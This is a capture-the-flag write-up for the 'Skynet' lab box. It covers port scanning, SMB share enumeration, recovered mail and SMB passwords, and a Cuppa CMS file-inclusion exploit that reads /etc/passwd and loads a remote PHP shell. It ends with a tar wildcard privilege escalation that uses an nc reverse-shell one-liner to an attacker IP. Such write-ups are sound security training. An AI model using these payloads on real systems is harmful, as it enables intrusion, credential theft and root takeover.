> Skynet

# Nmap/Rustscan

rustscan -a $IP --ulimit=5000 --batch-size=4500 -- -sC -sV -Pn -A | tee rustscan.log


```
22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        syn-ack Dovecot pop3d
|_pop3-capabilities: TOP CAPA UIDL PIPELINING SASL RESP-CODES AUTH-RESP-CODE
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack Dovecot imapd
|_imap-capabilities: listed IMAP4rev1 ID more LOGINDISABLEDA0001 LITERAL+ post-login have capabilities SASL-IR LOGIN-REFERRALS ENABLE OK Pre-login IDLE
445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Host script results:
|_clock-skew: mean: 1h40m08s, deviation: 2h53m13s, median: 8s
| nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   SKYNET<00>           Flags: <unique><active>
|   SKYNET<03>           Flags: <unique><active>
|   SKYNET<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 65062/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 65283/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 50068/udp): CLEAN (Failed to receive data)
|   Check 4 (port 9563/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2021-04-28T10:41:10-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-28T15:41:10
|_  start_date: N/A
```

# Enumeration

## SMB

smbclient -L //$IP////

```
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
```

We can't access milesdyson share but we can access `anonymous`.

smbclient \\\\$IP\\anonymous

```
attention.txt
logs (Dir) => Contains 3 files log1.txt, log2.txt. log3.txt
```

Looks like `log1.txt` has passwords. Maybe the 1'st try is the password `cyborg007haloterminator` for mile's email password. Username: `milesdyson`

# Gobuster

gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster/initial

```
/admin                (Status: 301) [Size: 312] [--> http://10.10.19.147/admin/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.19.147/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.19.147/js/]
/config               (Status: 301) [Size: 313] [--> http://10.10.19.147/config/]
/ai                   (Status: 301) [Size: 309] [--> http://10.10.19.147/ai/]
/squirrelmail 
```

We can login to squirrelmail using the same credentials. And we got some mails and one of them is SMB password.
**Password: `)s{A&2Z=F^n_E.B`**

smbclient \\\\$IP\\milesdyson -U milesdyson => We can find `important.txt` 

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

And from the hint we are given we have to do another directory bruteforcing.

# Gobuster

gobuster dir -u http://$IP//45kra24zxs28v3yd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o gobuster/secret

```
/administrator        (Status: 301) [Size: 337] [--> http://10.10.19.147/45kra24zxs28v3yd/administrator/]
```

It is cuppa cms and we have a single exploit in searchsploit for RFI. 

# POC

Accessing `http://10.10.19.147/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd` we have `/etc/passwd`.

# POC - Accessing Configuration.php

http://10.10.19.147/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php

On decoding we have the file.

```
<?php 
	class Configuration{
		public $host = "localhost";
		public $db = "cuppa";
		public $user = "root";
		public $password = "password123";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "";
		public $secure_login_redirect = "";
	} 
?>
```

We can pass our shell and access them in `http://10.10.19.147/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.107.21:8000/shell.php`. We have our shell as `www-data`.

# user.txt

```
7ce5c2109a40f958099283600a9ae807
```

# Priv-Esc

cat /etc/crontab

```
*/1 *	* * *   root	/home/milesdyson/backups/backup.sh
```

## backup.sh

```
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

Oooh tar has wildcards and we can exploit this!!

# Steps

1. echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.107.21 4444 >/tmp/f" > shell.sh
2. touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
3. touch "/var/www/html/--checkpoint=1"

We are in as root!

# root.txt

```
3f0372db24753accc7179a282cd6a949
```